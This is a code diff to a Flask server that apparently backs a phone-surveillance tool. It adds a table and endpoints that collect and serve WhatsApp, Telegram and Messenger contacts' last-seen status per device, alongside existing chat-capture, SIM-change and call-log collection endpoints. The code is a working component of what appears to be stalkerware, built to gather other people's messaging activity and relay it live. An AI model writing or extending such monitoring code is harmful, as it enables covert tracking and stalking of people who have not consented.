@@ -86,6 +86,11 @@ def init_db():
         device_id TEXT, old_sim TEXT, new_sim TEXT,
         old_operator TEXT, new_operator TEXT,
         timestamp TEXT, received_at TEXT)""")
+    # WhatsApp Status / Last Seen
+    c.execute("""CREATE TABLE IF NOT EXISTS whatsapp_status (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, contact TEXT, status TEXT,
+        app TEXT, timestamp TEXT, received_at TEXT)""")
     conn.commit()
     conn.close()
 
@@ -651,6 +656,41 @@ def api_chat_capture(device_id):
     except Exception as e:
         print(f"Chat capture error: {e}")
         return jsonify({"success": False, "error": str(e)})
+
+
+@app.route("/api/whatsapp-status/<device_id>", methods=["POST"])
+def api_whatsapp_status(device_id):
+    """Receive WhatsApp last seen / status updates"""
+    try:
+        data = request.get_json() or {}
+        contact = data.get("contact", "Unknown")
+        last_seen = data.get("last_seen", "")
+        pkg = data.get("package", "")
+        ts = data.get("timestamp", int(time.time() * 1000))
+        received = datetime.now().isoformat()
+
+        app_name = "WhatsApp"
+        if "telegram" in pkg: app_name = "Telegram"
+        elif "facebook" in pkg: app_name = "Messenger"
+
+        # Save to DB
+        db_exec("INSERT INTO whatsapp_status (device_id, contact, status, app, timestamp, received_at) VALUES (?,?,?,?,?,?)",
+                (device_id, contact, last_seen, app_name, ts, received))
+
+        broadcast_data("whatsapp_status", {"device_id": device_id, "contact": contact, "status": last_seen})
+        return jsonify({"success": True})
+    except Exception as e:
+        print(f"WA status error: {e}")
+        return jsonify({"success": False, "error": str(e)})
+
+
+@app.route("/api/whatsapp-status/<device_id>", methods=["GET"])
+def api_get_whatsapp_status(device_id):
+    limit = min(int(request.args.get("limit", 50)), 200)
+    rows = db_exec("""SELECT id, contact, status, app, timestamp, received_at
+        FROM whatsapp_status WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
+    return jsonify({"statuses": [{"id": r[0], "contact": r[1], "status": r[2],
+        "app": r[3], "ts": r[4], "received": r[5]} for r in rows]})
 
 
 @app.route("/api/collect-call-logs/<device_id>", methods=["POST"])
